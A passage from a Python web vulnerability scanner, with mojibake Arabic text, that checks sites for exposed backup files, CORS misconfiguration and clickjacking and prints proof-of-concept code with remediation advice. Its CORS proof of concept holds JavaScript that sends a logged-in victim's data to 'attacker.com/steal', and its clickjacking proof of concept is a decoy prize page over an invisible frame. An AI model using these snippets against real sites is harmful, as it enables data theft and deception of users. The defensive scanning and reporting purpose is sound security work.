    print(f"[+] Ø§Ù„Ø­Ø¬Ù…: {{len(response.content)}} Ø¨Ø§ÙŠØª")
    
    # Ø­ÙØ¸ Ø§Ù„Ù…Ù„Ù
    with open('backup_file{ext}', 'wb') as f:
        f.write(response.content)
    print("[+] ØªÙ… Ø­ÙØ¸ Ø§Ù„Ù…Ù„Ù Ù„ÙØ­ØµÙ‡")
"""
                        
                        self._add_vulnerability(
                            vuln_type='Exposed Backup Files',
                            severity='High',
                            url=test_url,
                            description=f'Ù…Ù„Ù backup Ù…ØªØ§Ø­: {filename}{ext}. Ù‚Ø¯ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø£ÙƒÙˆØ§Ø¯ Ù…ØµØ¯Ø±ÙŠØ© Ø£Ùˆ Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ø³Ø§Ø³Ø©.',
                            poc=poc_code,
                            remediation='Ø§Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ù…Ù„ÙØ§Øª Backup Ù…Ù† Ø§Ù„Ø®Ø§Ø¯Ù… Ø£Ùˆ Ø¶Ø¹Ù‡Ø§ ÙÙŠ Ù…Ø¬Ù„Ø¯Ø§Øª Ù…Ø­Ù…ÙŠØ©.'
                        )
                        return
                except:
                    continue
    
    def _scan_cors(self):
        """Scan for CORS misconfiguration"""
        try:
            test_origin = "https://evil.com"
            headers = {'Origin': test_origin}
            response = self.session.get(self.base_url, headers=headers, timeout=self.timeout)
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == '*' or (test_origin in acao and acac.lower() == 'true'):
                poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª CORS Misconfiguration
# Ø§Ù„Ù…ÙˆÙ‚Ø¹: {self.base_url}

import requests

headers = {{'Origin': 'https://evil.com'}}
response = requests.get("{self.base_url}", headers=headers)

acao = response.headers.get('Access-Control-Allow-Origin', '')
acac = response.headers.get('Access-Control-Allow-Credentials', '')

print(f"[+] Access-Control-Allow-Origin: {{acao}}")
print(f"[+] Access-Control-Allow-Credentials: {{acac}}")

if acao == '*' or 'evil.com' in acao:
    print("\\n[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù€ CORS Misconfiguration!")
    print("[+] ÙŠÙ…ÙƒÙ† Ù„Ù…ÙˆØ§Ù‚Ø¹ Ø®Ø§Ø±Ø¬ÙŠØ© Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø³Ø©")
    
# JavaScript Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ø«ØºØ±Ø©:
js_exploit = '''
<script>
fetch('{self.base_url}', {{
    credentials: 'include'
}})
.then(r => r.text())
.then(data => {{
    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ù…Ù‡Ø§Ø¬Ù…
    fetch('https://attacker.com/steal', {{
        method: 'POST',
        body: data
    }});
}});
</script>
'''
"""
                
                self._add_vulnerability(
                    vuln_type='CORS Misconfiguration',
                    severity='High',
                    url=self.base_url,
                    description='Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª CORS ØºÙŠØ± Ø¢Ù…Ù†Ø©. ÙŠÙ…ÙƒÙ† Ù„Ù…ÙˆØ§Ù‚Ø¹ Ø®Ø§Ø±Ø¬ÙŠØ© Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø³Ø©.',
                    poc=poc_code,
                    remediation='Ù‚Ù… Ø¨ØªØ­Ø¯ÙŠØ¯ Origins Ù…Ø­Ø¯Ø¯Ø© Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† *, Ù„Ø§ ØªØ³ØªØ®Ø¯Ù… credentials Ù…Ø¹ wildcard origin.'
                )
        except:
            pass
    
    def _scan_clickjacking(self):
        """Scan for clickjacking vulnerability"""
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            
            x_frame_options = response.headers.get('X-Frame-Options', '')
            csp = response.headers.get('Content-Security-Policy', '')
            
            vulnerable = not x_frame_options and 'frame-ancestors' not in csp.lower()
            
            if vulnerable:
                poc_code = f"""
# Ø¥Ø«Ø¨Ø§Øª Clickjacking Vulnerability
# Ø§Ù„Ù…ÙˆÙ‚Ø¹: {self.base_url}

# HTML Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ø«ØºØ±Ø©:
clickjacking_poc = '''
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking POC</title>
    <style>
        iframe {{
            position: relative;
            width: 800px;
            height: 600px;
            opacity: 0.1; /* Ø´ÙØ§ÙÙŠØ© Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±ØŒ Ø§Ø³ØªØ®Ø¯Ù… 0.0 Ù„Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ */
            z-index: 2;
        }}
        .decoy {{
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 1;
        }}
    </style>
</head>
<body>
    <h1>Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¬Ø§Ø¦Ø²Ø©!</h1>
    <div class="decoy">
        <button>Ø§Ø­ØµÙ„ Ø¹Ù„Ù‰ $1000 Ù…Ø¬Ø§Ù†Ø§Ù‹!</button>
    </div>
    <iframe src="{self.base_url}"></iframe>
</body>
</html>
'''

print("[+] Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø¹Ø±Ø¶ Ù„Ù€ Clickjacking!")
print("[+] ÙŠÙ…ÙƒÙ† Ø®Ø¯Ø§Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù„Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø¹Ù†Ø§ØµØ± Ù…Ø®ÙÙŠØ©")
print("\\n[+] Ø§Ø­ÙØ¸ Ø§Ù„ÙƒÙˆØ¯ Ø£Ø¹Ù„Ø§Ù‡ ÙÙŠ Ù…Ù„Ù HTML ÙˆØ§Ø®ØªØ¨Ø±Ù‡")
"""
                
                self._add_vulnerability(
                    vuln_type='Clickjacking',
                    severity='Medium',
                    url=self.base_url,
                    description='Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ø§ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø­Ù…Ø§ÙŠØ© Ù…Ù† Clickjacking (X-Frame-Options Ø£Ùˆ CSP frame-ancestors).',
                    poc=poc_code,
                    remediation='Ø£Ø¶Ù header X-Frame-Options: DENY Ø£Ùˆ CSP frame-ancestors directive.'
                )
        except:
            pass
    
    def _display_results(self):
        """Display comprehensive vulnerability results"""
        if not self.vulnerabilities:
            console.print("\n[green]âœ“ Ù„Ù… ÙŠØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø§Øª Ø£Ù…Ù†ÙŠØ© ÙˆØ§Ø¶Ø­Ø©[/green]")
            return
        
        console.print(f"\n[bold red]âš  ØªÙ… Ø§ÙƒØªØ´Ø§Ù {len(self.vulnerabilities)} Ø«ØºØ±Ø© Ø£Ù…Ù†ÙŠØ©![/bold red]\n")
        
        # Ø¬Ø¯ÙˆÙ„ Ù…Ù„Ø®Øµ Ø§Ù„Ø«ØºØ±Ø§Øª
        summary_table = Table(title="[bold red]Ù…Ù„Ø®Øµ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ©[/bold red]", show_header=True)
        summary_table.add_column("#", style="cyan", width=5)
        summary_table.add_column("Ø§Ù„Ù†ÙˆØ¹", style="yellow", width=25)
        summary_table.add_column("Ø§Ù„Ø®Ø·ÙˆØ±Ø©", style="red", width=12)
        summary_table.add_column("Ø§Ù„Ø±Ø§Ø¨Ø·", style="blue", width=50)
        
        for idx, vuln in enumerate(self.vulnerabilities, 1):
            severity_color = {
                'Critical': 'bold red',
                'High': 'red',
                'Medium': 'yellow',
                'Low': 'blue',
                'Info': 'cyan'
            }.get(vuln['severity'], 'white')
            
            summary_table.add_row(
                str(idx),
                vuln['type'],
                f"[{severity_color}]{vuln['severity']}[/{severity_color}]",
                vuln['url'][:47] + "..." if len(vuln['url']) > 50 else vuln['url']
            )
        
        console.print(summary_table)
        
        # ØªÙØ§ØµÙŠÙ„ ÙƒÙ„ Ø«ØºØ±Ø© Ù…Ø¹ POC
        console.print("\n[bold cyan]â•â•â• ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø«ØºØ±Ø§Øª ÙˆØ¥Ø«Ø¨Ø§Øª Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ (POC) â•â•â•[/bold cyan]\n")
        
        for idx, vuln in enumerate(self.vulnerabilities, 1):
            severity_color = {
                'Critical': 'bold red',
                'High': 'red',
                'Medium': 'yellow',
                'Low': 'blue',
                'Info': 'cyan'
            }.get(vuln['severity'], 'white')
            
            panel_content = f"""[bold white]Ø§Ù„ÙˆØµÙ:[/bold white]
{vuln['description']}

[bold white]Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨:[/bold white]
{vuln['url']}

[bold white]Ø§Ù„Ø­Ù„:[/bold white]
{vuln['remediation']}

[bold green]Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø«ØºØ±Ø© (POC):[/bold green]
[dim]{vuln['poc']}[/dim]
"""
            
            panel = Panel(
                panel_content,
                title=f"[{severity_color}][{idx}] {vuln['type']} - {vuln['severity']}[/{severity_color}]",
                border_style=severity_color,
                expand=False
            )
            
            console.print(panel)
            console.print()
